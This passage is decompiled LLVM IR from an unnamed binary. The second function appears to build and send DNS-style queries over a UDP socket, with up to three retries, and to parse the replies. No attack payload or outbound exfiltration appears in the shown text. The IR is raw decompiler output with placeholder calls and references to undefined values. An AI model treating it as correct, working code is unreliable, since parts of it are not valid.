  br label %dec_label_pc_1000a82c

dec_label_pc_1000a818:                            ; preds = %dec_label_pc_1000a800
  %v3_1000a818 = icmp eq i8 %v2_1000a7e4, 0
  %v1_1000a81c = add i32 %v0_1000a81c, 1
  br i1 %v3_1000a818, label %dec_label_pc_1000a82c, label %dec_label_pc_1000a824

dec_label_pc_1000a824:                            ; preds = %dec_label_pc_1000a818
  %v1_1000a824 = and i32 %v5_1000a7f4, 32
  %v3_1000a824 = icmp eq i32 %v1_1000a824, 0
  br i1 %v3_1000a824, label %dec_label_pc_1000a854, label %dec_label_pc_1000a82c

dec_label_pc_1000a82c:                            ; preds = %dec_label_pc_1000a824, %dec_label_pc_1000a818, %dec_label_pc_1000a810
  %v0_1000a7b43 = phi i32 [ %v1_1000a81c, %dec_label_pc_1000a824 ], [ %v1_1000a81c, %dec_label_pc_1000a818 ], [ %v1_1000a810, %dec_label_pc_1000a810 ]
  %v1_1000a82c = mul i32 %v0_1000a82c, 256
  %v1_1000a830 = add nuw nsw i32 %v0_1000a830, 1
  %v2_1000a834 = or i32 %v1_1000a834, %v1_1000a82c
  store i32 %v2_1000a834, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1000a830, 5
  br i1 %tmp10, label %dec_label_pc_1000a7b4, label %dec_label_pc_1000a840

dec_label_pc_1000a840:                            ; preds = %dec_label_pc_1000a82c
  %v0_1000a840 = load i32, i32* @r4, align 4
  %v3_1000a840 = icmp eq i32 %v0_1000a840, 0
  %v0_1000a848 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a840, i32 %v0_1000a848)
  %v0_1000a84c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a84c = load i32, i32* @r4, align 4
  %v2_1000a84c = inttoptr i32 %v1_1000a84c to i32*
  store i32 %v0_1000a84c, i32* %v2_1000a84c, align 4
  ret i32 1

dec_label_pc_1000a854:                            ; preds = %dec_label_pc_1000a808, %dec_label_pc_1000a824, %dec_label_pc_1000a7b4, %dec_label_pc_1000a7d4, %dec_label_pc_1000a79c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000a834, { 1, 0 }
  uselistorder i32 %v1_1000a830, { 1, 0 }
  uselistorder i32 %v0_1000a81c, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000a854, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000a7b4, { 1, 0 }
}

define i32 @function_1000a85c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1000a85c:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_1000a860 = load i32, i32* @lr, align 4
  store i32 %v0_1000a860, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268478604, i32* @lr, align 4
  %v1_1000a888 = call i32 @function_10007cec(i32 512)
  store i32 %v1_1000a888, i32* @r30, align 4
  store i32 268478616, i32* @lr, align 4
  %v1_1000a894 = call i32 @function_10007cec(i32 1025)
  %v0_1000a898 = load i32, i32* @r30, align 4
  %v3_1000a898 = icmp eq i32 %v0_1000a898, 0
  store i32 %v1_1000a894, i32* @r21, align 4
  br i1 %v3_1000a898, label %dec_label_pc_1000ae54, label %dec_label_pc_1000a8a4

dec_label_pc_1000a8a4:                            ; preds = %dec_label_pc_1000a85c
  %v3_1000a8a4 = icmp eq i32 %v1_1000a894, 0
  br i1 %v3_1000a8a4, label %dec_label_pc_1000ae54, label %dec_label_pc_1000a8ac

dec_label_pc_1000a8ac:                            ; preds = %dec_label_pc_1000a8a4
  %v0_1000a8ac = load i32, i32* @r23, align 4
  %v3_1000a8ac = icmp eq i32 %v0_1000a8ac, 0
  br i1 %v3_1000a8ac, label %dec_label_pc_1000ae54, label %dec_label_pc_1000a8b4

dec_label_pc_1000a8b4:                            ; preds = %dec_label_pc_1000a8ac
  %v0_1000a8b4 = load i32, i32* %r14.global-to-local, align 4
  %v1_1000a8b4 = inttoptr i32 %v0_1000a8b4 to i8*
  %v2_1000a8b4 = load i8, i8* %v1_1000a8b4, align 1
  %v3_1000a8b4 = zext i8 %v2_1000a8b4 to i32
  store i32 %v3_1000a8b4, i32* %r0.global-to-local, align 4
  %v3_1000a8b8 = icmp eq i8 %v2_1000a8b4, 0
  br i1 %v3_1000a8b8, label %dec_label_pc_1000ae54, label %dec_label_pc_1000a8c0

dec_label_pc_1000a8c0:                            ; preds = %dec_label_pc_1000a8b4
  store i32 %v0_1000a8b4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  %v0_1000a8c8 = call i32 @function_10006ed4()
  %v0_1000a8d0 = load i32, i32* %r14.global-to-local, align 4
  %v2_1000a8d0 = add i32 %v0_1000a8d0, %v0_1000a8c8
  %v1_1000a8d8 = add i32 %v2_1000a8d0, -1
  %v2_1000a8d8 = inttoptr i32 %v1_1000a8d8 to i8*
  %v3_1000a8d8 = load i8, i8* %v2_1000a8d8, align 1
  %v4_1000a8d8 = zext i8 %v3_1000a8d8 to i32
  store i32 %v4_1000a8d8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012b0c.297 to i32), i32* %r29.global-to-local, align 4
  %v2_1000a8e0 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_1000a8e0, i32* %r28.global-to-local, align 4
  store i32 %v2_1000a8e0, i32* @r3, align 4
  store i32 -1, i32* @r19, align 4
  %v1_1000a8f0 = xor i32 %v4_1000a8d8, 46
  store i32 %v1_1000a8f0, i32* %r17.global-to-local, align 4
  %v0_1000a8f4 = call i32 @function_10008c80()
  %v1_1000a8fc = call i32 @llvm.ctlz.i32(i32 %v1_1000a8f0, i1 true)
  store i32 %v1_1000a8fc, i32* %r17.global-to-local, align 4
  %v0_1000a900 = call i32 @function_10008c78()
  %v3_1000a908 = load i32, i32* @global_var_100104c4.298, align 4
  store i32 %v3_1000a908, i32* %r11.global-to-local, align 4
  %v3_1000a910 = load i16, i16* @global_var_100103dc.299, align 2
  %v4_1000a910 = zext i16 %v3_1000a910 to i32
  store i32 %v4_1000a910, i32* @r25, align 4
  store i32 %v2_1000a8e0, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  %v1_1000a920 = load i32, i32* @r23, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_1000a920 = srem i32 %v3_1000a908, %v1_1000a920
  %v2_1000a92c = sub i32 %v3_1000a908, %v2_1000a920
  store i32 %v2_1000a92c, i32* %r0.global-to-local, align 4
  store i32 %v2_1000a920, i32* @r26, align 4
  %v0_1000a934 = call i32 @function_10008c80()
  %v0_1000ae48.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_1000ae48.pr19, 3
  br i1 %tmp57, label %dec_label_pc_1000a93c.lr.ph.lr.ph, label %dec_label_pc_1000ae60

dec_label_pc_1000a93c.lr.ph.lr.ph:                ; preds = %dec_label_pc_1000a8c0
  %v2_1000a954 = ptrtoint i32* %stack_var_-144 to i32
  %v2_1000aa68 = ptrtoint i32* %stack_var_-204 to i32
  %v2_1000aac8 = ptrtoint i16* %stack_var_-212 to i32
  %v2_1000ab0c = ptrtoint i32* %stack_var_-248 to i32
  %v3_1000ab68 = icmp eq i32 %tmp37, 0
  %v3_1000ab74 = icmp eq i32 %tmp36, 3
  %v2_1000abf0 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1000ac44 = ptrtoint i32* %stack_var_-184 to i32
  %v3_1000ac70 = icmp eq i32 %tmp33, 0
  %v3_1000abe4 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_1000a93c.lr.ph

dec_label_pc_1000a93c:                            ; preds = %dec_label_pc_1000a93c.lr.ph, %dec_label_pc_1000aaec
  %v0_1000a93c = load i32, i32* @r19, align 4
  %v3_1000a93c = icmp eq i32 %v0_1000a93c, -1
  br i1 %v3_1000a93c, label %dec_label_pc_1000a94c, label %dec_label_pc_1000a944

dec_label_pc_1000a944:                            ; preds = %dec_label_pc_1000a93c
  store i32 268478796, i32* @lr, align 4
  %v1_1000a948 = call i32 @function_100048e0(i32 %v0_1000a93c)
  br label %dec_label_pc_1000a94c

dec_label_pc_1000a94c:                            ; preds = %dec_label_pc_1000a93c, %dec_label_pc_1000a944
  store i32 %v2_1000a954, i32* %r29.global-to-local, align 4
  %v0_1000a958 = load i32, i32* @r30, align 4
  store i32 268478816, i32* @lr, align 4
  %v3_1000a95c = call i32 @function_10006e24(i32 %v0_1000a958, i32 0, i32 512)
  store i32 268478832, i32* @lr, align 4
  %v3_1000a96c = call i32 @function_10006e24(i32 %v2_1000a954, i32 0, i32 48)
  %v0_1000a970 = load i32, i32* @r25, align 4
  %v1_1000a970 = add i32 %v0_1000a970, 1
  %v1_1000a974 = urem i32 %v1_1000a970, 65536
  store i32 %v1_1000a974, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000a980 = load i32, i32* @r30, align 4
  store i32 %v1_1000a974, i32* %stack_var_-144, align 4
  %v4_1000a994 = call i32 @function_1000c2d4(i32* nonnull %stack_var_-144, i32 %v0_1000a980, i32 512)
  store i32 %v4_1000a994, i32* %r28.global-to-local, align 4
  %v1_1000a998 = icmp slt i32 %v4_1000a994, 0
  br i1 %v1_1000a998, label %dec_label_pc_1000ae60, label %dec_label_pc_1000a9a0

dec_label_pc_1000a9a0:                            ; preds = %dec_label_pc_1000a94c
  %v0_1000a9a0 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_1000a9a0, i32* @r4, align 4
  %v0_1000a9a8 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268478900, i32* @lr, align 4
  %v4_1000a9b0 = call i32 @function_10007064(i32 %v0_1000a9a8, i32 %v0_1000a9a0, i32 1025)
  store i32 ptrtoint (i32* @global_var_100103e0.251 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000a8e0, i32* @r3, align 4
  %v0_1000a9c8 = call i32 @function_10008c80()
  %v0_1000a9d0 = call i32 @function_10008c78()
  %v0_1000a9d8 = load i32, i32* @r22, align 4
  %v1_1000a9d8 = icmp slt i32 %v0_1000a9d8, 0
  %v0_1000a9dc = load i32, i32* @r26, align 4
  %v1_1000a9dc = mul i32 %v0_1000a9dc, 4
  store i32 %v1_1000a9dc, i32* %r0.global-to-local, align 4
  %v2_1000a9e0 = add i32 %v1_1000a9dc, %arg4
  %v3_1000a9e0 = inttoptr i32 %v2_1000a9e0 to i32*
  %v4_1000a9e0 = load i32, i32* %v3_1000a9e0, align 4
  store i32 %v4_1000a9e0, i32* %r29.global-to-local, align 4
  br i1 %v1_1000a9d8, label %dec_label_pc_1000aa28, label %dec_label_pc_1000a9e8

dec_label_pc_1000a9e8:                            ; preds = %dec_label_pc_1000a9a0
  %v3_1000a9ec = load i32, i32* @global_var_100104cc.301, align 4
  store i32 %v3_1000a9ec, i32* %r0.global-to-local, align 4
  %v2_1000a9f0 = icmp slt i32 %v0_1000a9d8, %v3_1000a9ec
  br i1 %v2_1000a9f0, label %dec_label_pc_1000a9f8, label %dec_label_pc_1000aa28

dec_label_pc_1000a9f8:                            ; preds = %dec_label_pc_1000a9e8
  store i32 ptrtoint (i32* @global_var_1000f330.302 to i32), i32* @r4, align 4
  %v0_1000aa04 = load i32, i32* @r21, align 4
  store i32 268478988, i32* @lr, align 4
  %v4_1000aa08 = inttoptr i32 %v0_1000aa04 to i8*
  %v5_1000aa08 = call i32 @function_1000bac8(i8* %v4_1000aa08, i32 ptrtoint (i32* @global_var_1000f330.302 to i32), i32 1025, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_1000aa10 = load i32, i32* @r22, align 4
  %v1_1000aa10 = mul i32 %v0_1000aa10, 4
  store i32 %v1_1000aa10, i32* %r0.global-to-local, align 4
  %v2_1000aa18 = add i32 %v1_1000aa10, ptrtoint (i32* @global_var_10012d3c.303 to i32)
  %v3_1000aa18 = inttoptr i32 %v2_1000aa18 to i32*
  %v4_1000aa18 = load i32, i32* %v3_1000aa18, align 4
  store i32 %v4_1000aa18, i32* @r4, align 4
  %v0_1000aa1c = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000aa28.304 to i32), i32* @lr, align 4
  %v4_1000aa24 = inttoptr i32 %v0_1000aa1c to i8*
  %v5_1000aa24 = call i32 @function_1000bac8(i8* %v4_1000aa24, i32 %v4_1000aa18, i32 1025, i32 ptrtoint (i32* @global_var_10012d3c.303 to i32))
  br label %dec_label_pc_1000aa28

dec_label_pc_1000aa28:                            ; preds = %dec_label_pc_1000a9e8, %dec_label_pc_1000a9a0, %dec_label_pc_1000a9f8
  store i32 %v2_1000a8e0, i32* @r3, align 4
  %v0_1000aa30 = call i32 @function_10008c80()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000aa3c = load i32, i32* @r30, align 4
  %v1_1000aa3c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000aa3c = add i32 %v1_1000aa3c, %v0_1000aa3c
  %v1_1000aa40 = sub i32 512, %v1_1000aa3c
  %v0_1000aa48 = load i32, i32* @r21, align 4
  store i32 %v0_1000aa48, i32* %stack_var_-240, align 4
  store i32 268479060, i32* @lr, align 4
  %v4_1000aa50 = call i32 @function_1000c484(i32* nonnull %stack_var_-240, i32 %v2_1000aa3c, i32 %v1_1000aa40)
  store i32 %v4_1000aa50, i32* @r27, align 4
  %v1_1000aa54 = icmp slt i32 %v4_1000aa50, 0
  br i1 %v1_1000aa54, label %dec_label_pc_1000ae60, label %dec_label_pc_1000aa5c

dec_label_pc_1000aa5c:                            ; preds = %dec_label_pc_1000aa28
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000aa64 = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268479092, i32* @lr, align 4
  %v3_1000aa70 = inttoptr i32 %v0_1000aa64 to i8*
  %v4_1000aa70 = call i32 @function_1000bcc4(i32 10, i8* %v3_1000aa70, i32 %v2_1000aa68)
  %tmp59 = icmp slt i32 %v4_1000aa70, 1
  br i1 %tmp59, label %dec_label_pc_1000aa84thread-pre-split, label %dec_label_pc_1000aa7c

dec_label_pc_1000aa7c:                            ; preds = %dec_label_pc_1000aa5c
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000aa84

dec_label_pc_1000aa84thread-pre-split:            ; preds = %dec_label_pc_1000aa5c
  %v3_1000aa84.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000aa84

dec_label_pc_1000aa84:                            ; preds = %dec_label_pc_1000aa84thread-pre-split, %dec_label_pc_1000aa7c
  %v3_1000aa84 = phi i16 [ %v3_1000aa84.pr, %dec_label_pc_1000aa84thread-pre-split ], [ 10, %dec_label_pc_1000aa7c ]
  %v3_1000aa88 = icmp eq i16 %v3_1000aa84, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_1000aa88, label %dec_label_pc_1000aab0, label %dec_label_pc_1000aa9c

dec_label_pc_1000aa9c:                            ; preds = %dec_label_pc_1000aa84
  %v0_1000aaa0 = load i32, i32* @r29, align 4
  store i32 268479148, i32* @lr, align 4
  %v1_1000aaa8 = call i32 @function_1000776c(i32 %v0_1000aaa0)
  %v3_1000aab0.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000aab0

dec_label_pc_1000aab0:                            ; preds = %dec_label_pc_1000aa84, %dec_label_pc_1000aa9c
  %v3_1000aab0 = phi i16 [ 10, %dec_label_pc_1000aa84 ], [ %v3_1000aab0.pre, %dec_label_pc_1000aa9c ]
  %v4_1000aab0 = sext i16 %v3_1000aab0 to i32
  store i32 268479168, i32* @lr, align 4
  %v3_1000aabc = call i32 @function_10007cb8(i32 %v4_1000aab0, i32 2, i32 17)
  store i32 %v3_1000aabc, i32* @r19, align 4
  %v1_1000aac0 = icmp slt i32 %v3_1000aabc, 0
  br i1 %v1_1000aac0, label %dec_label_pc_1000aaec, label %dec_label_pc_1000aac8

dec_label_pc_1000aac8:                            ; preds = %dec_label_pc_1000aab0
  store i32 268479188, i32* @lr, align 4
  %v3_1000aad0 = call i32 @function_10007ba0(i32 %v2_1000aac8, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_1000aad0, -1
  br i1 %tmp60, label %dec_label_pc_1000aaf4, label %dec_label_pc_1000aadc

dec_label_pc_1000aadc:                            ; preds = %dec_label_pc_1000aac8
  %v0_1000aadc = call i32 @function_10004b48()
  %v1_1000aae0 = inttoptr i32 %v0_1000aadc to i32*
  %v2_1000aae0 = load i32, i32* %v1_1000aae0, align 4
  store i32 %v2_1000aae0, i32* %r0.global-to-local, align 4
  %v3_1000aae4 = icmp eq i32 %v2_1000aae0, 101
  br i1 %v3_1000aae4, label %dec_label_pc_1000ae2c, label %dec_label_pc_1000aaec

dec_label_pc_1000aaec:                            ; preds = %dec_label_pc_1000aadc, %dec_label_pc_1000aab0
  %v0_1000aaec = load i32, i32* %r18.global-to-local, align 4
  %v1_1000aaec = add i32 %v0_1000aaec, 1
  store i32 %v1_1000aaec, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_1000aaec, 3
  br i1 %tmp61, label %dec_label_pc_1000a93c, label %dec_label_pc_1000ae60

dec_label_pc_1000aaf4:                            ; preds = %dec_label_pc_1000aac8
  %v0_1000aaf4 = load i32, i32* @r28, align 4
  %v1_1000aaf4 = load i32, i32* @r27, align 4
  %v2_1000aaf4 = add i32 %v1_1000aaf4, %v0_1000aaf4
  %v0_1000aaf8 = load i32, i32* @r30, align 4
  %v0_1000ab00 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_1000ab08.306 to i32), i32* @lr, align 4
  %v4_1000ab04 = call i32 @function_1000b224(i32 %v0_1000ab00, i32 %v0_1000aaf8, i32 %v2_1000aaf4, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000ab1c = load i32, i32* @r19, align 4
  store i32 %v0_1000ab1c, i32* %stack_var_-248, align 4
  store i32 268479268, i32* @lr, align 4
  %v3_1000ab20 = call i32 @function_1000b5b4(i32 %v2_1000ab0c, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_1000ab20, 1
  br i1 %tmp62, label %dec_label_pc_1000ae2c, label %dec_label_pc_1000ab2c

dec_label_pc_1000ab2c:                            ; preds = %dec_label_pc_1000aaf4
  %v0_1000ab2c = load i32, i32* @r19, align 4
  %v0_1000ab30 = load i32, i32* @r30, align 4
  store i32 268479296, i32* @lr, align 4
  %v4_1000ab3c = call i32 @function_10007c04(i32 %v0_1000ab2c, i32 %v0_1000ab30, i32 512, i32 0)
  store i32 %v4_1000ab3c, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_1000ab3c, 12
  br i1 %tmp63, label %dec_label_pc_1000add4, label %dec_label_pc_1000ab4c

dec_label_pc_1000ab4c:                            ; preds = %dec_label_pc_1000ab2c
  %v0_1000ab4c = load i32, i32* @r30, align 4
  %v2_1000ab54 = inttoptr i32 %v0_1000ab4c to i8*
  %v3_1000ab54 = call i32 @function_1000c3c0(i8* %v2_1000ab54, i32 %v2_1000a954)
  %v3_1000ab58 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_1000ab58, i32* @r20, align 4
  %v1_1000ab5c = load i32, i32* @r25, align 4
  %v4_1000ab5c = icmp eq i32 %v3_1000ab58, %v1_1000ab5c
  br i1 %v4_1000ab5c, label %dec_label_pc_1000ab64, label %dec_label_pc_1000add4

dec_label_pc_1000ab64:                            ; preds = %dec_label_pc_1000ab4c
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ab68, label %dec_label_pc_1000add4, label %dec_label_pc_1000ab70

dec_label_pc_1000ab70:                            ; preds = %dec_label_pc_1000ab64
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ab74, label %dec_label_pc_1000ab7c, label %dec_label_pc_1000abe4

dec_label_pc_1000ab7c:                            ; preds = %dec_label_pc_1000ab70
  %v0_1000ab7c = load i32, i32* %r17.global-to-local, align 4
  %v3_1000ab7c = icmp eq i32 %v0_1000ab7c, 0
  br i1 %v3_1000ab7c, label %dec_label_pc_1000ab84, label %dec_label_pc_1000abd8

dec_label_pc_1000ab84:                            ; preds = %dec_label_pc_1000ab7c
  store i32 ptrtoint (i32* @global_var_100103e0.251 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000a8e0, i32* %r28.global-to-local, align 4
  store i32 %v2_1000a8e0, i32* @r3, align 4
  %v0_1000aba0 = call i32 @function_10008c80()
  %v0_1000aba8 = call i32 @function_10008c78()
  %v3_1000abb0 = load i32, i32* @global_var_100104cc.301, align 4
  store i32 %v3_1000abb0, i32* %r29.global-to-local, align 4
  store i32 %v2_1000a8e0, i32* @r3, align 4
  %v0_1000abbc = call i32 @function_10008c80()
  %v0_1000abc0 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000abc0 = add i32 %v0_1000abc0, -1
  store i32 %v1_1000abc0, i32* %r29.global-to-local, align 4
  %v0_1000abc4 = load i32, i32* @r22, align 4
  %v2_1000abc4 = icmp slt i32 %v0_1000abc4, %v1_1000abc0
  br i1 %v2_1000abc4, label %dec_label_pc_1000abcc, label %dec_label_pc_1000abd8

dec_label_pc_1000abcc:                            ; preds = %dec_label_pc_1000ab84
  %v1_1000abcc = add i32 %v0_1000abc4, 1
  store i32 %v1_1000abcc, i32* @r22, align 4
  %v0_1000abd0 = load i32, i32* @r20, align 4
  store i32 %v0_1000abd0, i32* @r25, align 4
  br label %dec_label_pc_1000ae48thread-pre-split.backedge

dec_label_pc_1000abd8:                            ; preds = %dec_label_pc_1000ab84, %dec_label_pc_1000ab7c
  %v0_1000abd8 = call i32 @function_1000954c()
  br label %dec_label_pc_1000ac0c

dec_label_pc_1000abe4:                            ; preds = %dec_label_pc_1000ab70
  br i1 %v3_1000abe4, label %dec_label_pc_1000abec, label %dec_label_pc_1000add4

dec_label_pc_1000abec:                            ; preds = %dec_label_pc_1000abe4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_1000ac04, label %dec_label_pc_1000abf8

dec_label_pc_1000abf8:                            ; preds = %dec_label_pc_1000abec
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1000ac2410 = load i32, i32* @r30, align 4
  store i32 %v0_1000ac2410, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000ac14

dec_label_pc_1000ac04:                            ; preds = %dec_label_pc_1000abec
  %v0_1000ac04 = call i32 @function_1000954c()
  br label %dec_label_pc_1000ac0c

dec_label_pc_1000ac0c:                            ; preds = %dec_label_pc_1000abd8, %dec_label_pc_1000ac04
  %storemerge3 = phi i32 [ %v0_1000ac04, %dec_label_pc_1000ac04 ], [ %v0_1000abd8, %dec_label_pc_1000abd8 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1000ac04 ], [ 1, %dec_label_pc_1000abd8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_1000ac0c = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_1000ac0c, align 4
  br label %dec_label_pc_1000ae70

dec_label_pc_1000ac14:                            ; preds = %dec_label_pc_1000abf8, %dec_label_pc_1000ac14
  %v0_1000ac2414 = phi i32 [ %v0_1000ac2410, %dec_label_pc_1000abf8 ], [ %v0_1000ac24, %dec_label_pc_1000ac14 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_1000abf8 ], [ %v2_1000ac18, %dec_label_pc_1000ac14 ]
  store i32 268479512, i32* @lr, align 4
  %v2_1000ac14 = call i32 @function_1000c500(i32 %v0_1000ac2414, i32 %storemerge213)
  %v0_1000ac18 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000ac18 = add i32 %v0_1000ac18, %v2_1000ac14
  %v0_1000ac28.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_1000ac18, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1000ac18, i32* @r4, align 4
  %v0_1000ac24 = load i32, i32* @r30, align 4
  store i32 %v0_1000ac24, i32* @r3, align 4
  %v2_1000ac28 = icmp slt i32 %v0_1000ac28.pr, 1
  %v1_1000ac2c = add i32 %v0_1000ac28.pr, 1
  store i32 %v1_1000ac2c, i32* %r29.global-to-local, align 4
  br i1 %v2_1000ac28, label %dec_label_pc_1000ac14, label %dec_label_pc_1000ac34

dec_label_pc_1000ac34:                            ; preds = %dec_label_pc_1000ac14
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_1000abf0, label %dec_label_pc_1000ad80, label %dec_label_pc_1000ad88

dec_label_pc_1000ac44:                            ; preds = %dec_label_pc_1000ad80
  store i32 %v2_1000ac44, i32* %r29.global-to-local, align 4
  %v0_1000ac48 = load i32, i32* @r30, align 4
  store i32 268479580, i32* @lr, align 4
  %v5_1000ac58 = call i32 @function_1000c52c(i32 %v0_1000ac48, i32 %v0_1000ac4c, i32 %v1_1000ad80, i32* nonnull %stack_var_-184)
  store i32 %v5_1000ac58, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_1000ac58, -1
  br i1 %tmp64, label %dec_label_pc_1000ac7c, label %dec_label_pc_1000ac64

dec_label_pc_1000ac64:                            ; preds = %dec_label_pc_1000ac44
  %v0_1000ac64 = load i32, i32* @r24, align 4
  %v3_1000ac64 = icmp eq i32 %v0_1000ac64, 0
  br i1 %v3_1000ac64, label %dec_label_pc_1000add4, label %dec_label_pc_1000ac6c

dec_label_pc_1000ac6c:                            ; preds = %dec_label_pc_1000ac64
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ac70, label %dec_label_pc_1000add4, label %dec_label_pc_1000ad88

dec_label_pc_1000ac7c:                            ; preds = %dec_label_pc_1000ac44
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_1000ac80 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_1000ac80, label %dec_label_pc_1000ad24, label %dec_label_pc_1000ac88

dec_label_pc_1000ac88:                            ; preds = %dec_label_pc_1000ac7c
  %v0_1000ac88 = load i32, i32* @r31, align 4
  store i32 %v2_1000ac44, i32* @r4, align 4
  %v1_1000ac90 = add i32 %v0_1000ac88, 28
  %v2_1000ac90 = inttoptr i32 %v1_1000ac90 to i32*
  %v3_1000ac90 = load i32, i32* %v2_1000ac90, align 4
  store i32 %v3_1000ac90, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ac88, i32* @r3, align 4
  %v1_1000ac98 = add i32 %v0_1000ac88, 36
  %v2_1000ac98 = inttoptr i32 %v1_1000ac98 to i32*
  %v3_1000ac98 = load i32, i32* %v2_1000ac98, align 4
  store i32 %v3_1000ac98, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268479664, i32* @lr, align 4
  %v0_1000acac = call i32 @function_10006d88()
  %v0_1000acb0 = load i32, i32* @r31, align 4
  %v1_1000acb0 = add i32 %v0_1000acb0, 4
  %v2_1000acb0 = inttoptr i32 %v1_1000acb0 to i32*
  %v3_1000acb0 = load i32, i32* %v2_1000acb0, align 4
  %v3_1000acb4 = icmp eq i32 %v3_1000acb0, 24
  br i1 %v3_1000acb4, label %dec_label_pc_1000ac88.dec_label_pc_1000acd8_crit_edge, label %dec_label_pc_1000acbc

dec_label_pc_1000ac88.dec_label_pc_1000acd8_crit_edge: ; preds = %dec_label_pc_1000ac88
  %v1_1000acd8.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000acd8

dec_label_pc_1000acbc:                            ; preds = %dec_label_pc_1000ac88
  %v1_1000acbc = add i32 %v0_1000acb0, 28
  %v2_1000acbc = inttoptr i32 %v1_1000acbc to i32*
  %v3_1000acbc = load i32, i32* %v2_1000acbc, align 4
  store i32 %v3_1000acbc, i32* %r0.global-to-local, align 4
  %v3_1000acc0 = icmp eq i32 %v3_1000acbc, 0
  br i1 %v3_1000acc0, label %dec_label_pc_1000ad88, label %dec_label_pc_1000acc8

dec_label_pc_1000acc8:                            ; preds = %dec_label_pc_1000acbc
